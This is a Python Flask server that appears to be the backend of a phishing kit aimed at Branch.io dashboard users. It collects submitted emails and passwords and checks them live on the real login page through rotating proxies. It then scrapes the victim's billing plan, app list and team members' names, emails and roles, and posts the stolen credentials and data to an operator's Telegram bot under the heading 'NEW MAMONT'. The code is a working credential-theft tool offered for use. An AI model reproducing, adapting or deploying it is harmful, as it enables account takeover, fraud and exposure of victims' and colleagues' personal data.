import os
import random
import ssl
from flask import Flask, redirect, render_template, request, jsonify, send_from_directory
from playwright.sync_api import sync_playwright
import threading
import requests
import logging
import json
from pystyle import Write, System, Colors, Colorate, Anime


GLOBAL_CFG_FILE = 'settings.json'

if os.path.exists(GLOBAL_CFG_FILE):
    with open(GLOBAL_CFG_FILE, 'r') as f:
        parsed_data = json.load(f)


# Replace these with your actual Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = parsed_data["TOKEN"]
CHAT_ID = parsed_data["chat_id"]
proxy_filename = parsed_data["proxy_filename"]
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)  # Установите уровень, чтобы показывать только ошибки

def get_random_proxy():
    # Read proxy list from file
    with open(proxy_filename, 'r') as f:
        proxies = f.readlines()
    # Choose a random proxy
    selected_proxy = random.choice(proxies).strip()
    
    # Split the proxy into its components
    user_pass, ip_port = selected_proxy.split('@')
    username, password = user_pass.split(':')
    ip, port = ip_port.split(':')

    # Format the proxy for Playwright
    return {
        'server': f'http://{ip}:{port}',
        'username': username,
        'password': password
    }




def send_telegram_message(log, passw, app_plan, app_list, tdata):
    # Formatting the team data into a table-like structure
    team_data_str = "\n".join(
        [f"`{'Name':<15} {'Email':<25} {'Role':<10}`\n"] +
        [f"`{member['name']:<15} {member['email']:<25} {member['role']:<10}`" for member in tdata]
    )

    # Create a numbered list with emojis for the app list
    app_list_str = "\n".join([f"{i+1}. 🔰 {app}" for i, app in enumerate(app_list)])
    
    # Formatting the message with emojis and table included
    message = (
        f"🌟 *NEW MAMONT* 🌟\n\n"
        f"👤 *LOGIN:* `{log}`\n"
        f"🔑 *PASSWORD:* `{passw}`\n\n"
        f"📋 *APP PLAN:* `{app_plan}`\n\n"
        f"🚀 *APP LIST:*\n{app_list_str}\n\n"
        f"👥 *TEAM DATA:*\n{team_data_str}\n♥ With love by: @whatzwastaken "
    )

    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    requests.post(url, json=payload)




app = Flask(__name__)

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory('static', filename)


def scrape_data(email, password):
    proxy = get_random_proxy()
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False, proxy=proxy)
        page = browser.new_page()
        log, passw = email, password
        def sign_in(email, password):
            page.goto('https://dashboard.branch.io/login')
            page.wait_for_load_state('domcontentloaded')

            page.wait_for_selector('input[name="email"]')
            page.fill('input[name="email"]', email)
            page.fill('input[name="password"]', password)
            page.wait_for_selector('button[data-testid="btn-sign-in"]')
            page.click('button[data-testid="btn-sign-in"]')
            

            page.wait_for_timeout(2000)
            if page.locator('#FormInput__password-input__input-helper-text').is_visible():
                error_message = page.locator('#FormInput__password-input__input-helper-text').inner_text()
                browser.close()
                return jsonify({'error': error_message})  # Возвращаем текст ошибки
            elif page.get_by_text("Sign up").is_visible():
                sign_in(email=email, password=password)

        sign_in(email=email, password=password)

        page.wait_for_load_state('domcontentloaded')

        page.goto("https://dashboard.branch.io/account-settings/billing")
        page.wait_for_load_state('networkidle')
        text_from_xpath = page.locator('//html/body/div[1]/div/div/div[2]/div[2]/div/div/div/div/div[1]/div/div[1]/div[2]/div/h3').inner_text()
        acc_plan = text_from_xpath


        page.click('//html/body/div[1]/div/div/div[1]/div[3]/div[1]')

        app_names = page.locator('div.app-selector__list-container ul.app-selector__list li span.app-selector__item-name')
        app_list = [app_name.inner_text() for app_name in app_names.all()]
        applist = app_list


        page.goto("https://dashboard.branch.io/account-settings/team")
        page.wait_for_load_state('networkidle')
        team_rows = page.locator('tbody[data-testid="smart-table-body"] tr')

        team_data = []
        for row in team_rows.all():
            name = row.locator('td:nth-child(1) span').inner_text()
            email = row.locator('td:nth-child(2) span').inner_text()
            role = row.locator('td:nth-child(3) span').inner_text()
            team_data.append({'name': name, 'email': email, 'role': role})

        tdata = team_data

        browser.close()

        send_telegram_message(log, passw, acc_plan, applist, tdata)

@app.route('/validate', methods=['POST'])
def validate():
    data = request.json
    email = data['email']
    password = data['password']


    if not email or not password:
        return jsonify({'error': 'Поля не могут быть пустыми.'})
    
    proxy = get_random_proxy()
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False, proxy=proxy)
        page = browser.new_page()
        def sign_in(email, password):
            page.goto('https://dashboard.branch.io/login')
            page.wait_for_load_state('domcontentloaded')
            print(email, password)

            page.wait_for_selector('input[name="email"]')
            page.fill('input[name="email"]', email)
            page.fill('input[name="password"]', password)
            page.wait_for_selector('button[data-testid="btn-sign-in"]')
            page.click('button[data-testid="btn-sign-in"]')
            

            page.wait_for_timeout(2000)
            if page.locator('#FormInput__password-input__input-helper-text').is_visible():
                error_message = page.locator('#FormInput__password-input__input-helper-text').inner_text()
                browser.close()
                return jsonify({'error': error_message})  
            elif page.get_by_text("Sign up").is_visible():
                sign_in(email=email, password=password)

        sign_in(email=email, password=password)
        browser.close()
        

        scraping_thread = threading.Thread(target=scrape_data, args=(email, password))
        scraping_thread.start()
        
        return jsonify({'message': "success"})
if __name__ == '__main__':
    Write.Print("""
  _                       ____               _               _             _   _____   _____   _____ 
 | |_    __ _     _      / __ \  __      __ | |__     __ _  | |_   ____   / | |___ /  |___ /  |___  |
 | __|  / _` |   (_)    / / _` | \ \ /\ / / | '_ \   / _` | | __| |_  /   | |   |_ \    |_ \     / / 
 | |_  | (_| |    _    | | (_| |  \ V  V /  | | | | | (_| | | |_   / /    | |  ___) |  ___) |   / /  
  \__|  \__, |   (_)    \ \__,_|   \_/\_/   |_| |_|  \__,_|  \__| /___|   |_| |____/  |____/   /_/   
        |___/            \____/                                                                      \n\n\n""", Colors.yellow_to_red, interval=0.000)
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    ssl_context.load_cert_chain('certificate.crt', 'certificate.key')
    app.run(ssl_context=ssl_context, host='0.0.0.0', port='443', debug=False, use_reloader=False)
